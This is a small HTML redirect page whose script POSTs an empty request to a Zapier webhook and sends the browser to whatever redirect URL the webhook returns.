<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        async function redirect() {
            try {
                const response = await fetch('https://hooks.zapier.com/hooks/catch/20832508/2iohz31/', {
                    method: 'POST',
                });
                const data = await response.json();
                if (data.redirectURL) {
                    window.location.href = data.redirectURL;
                } else {
                    console.error('No redirectURL provided in the response');
                }
            } catch (error) {
                console.error('Error during redirection:', error);
            }
        }
        redirect();
    </script>
</body>
</html>
